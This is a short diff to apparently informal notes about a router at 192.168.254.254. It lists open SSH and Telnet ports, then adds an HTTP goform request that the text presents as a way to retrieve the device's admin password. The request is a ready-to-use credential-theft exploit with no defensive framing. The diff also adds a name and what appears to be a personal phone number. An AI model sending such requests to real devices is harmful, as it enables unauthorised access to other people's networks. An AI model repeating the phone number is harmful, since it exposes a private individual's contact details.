@@ -28,5 +28,8 @@ OpenPorts:
 * 8357 (SSH)
 * 4719 (Telnet)
 
+How to get Admin Password via 192.168.254.254:
+* http://192.168.254.254/goform/goform_get_cmd_process?isTest=false&cmd=admin_Password
 
-( C ) - Jhowel Gracio Huerto
+
+( C ) - Xin Snowflakes, 09225205353
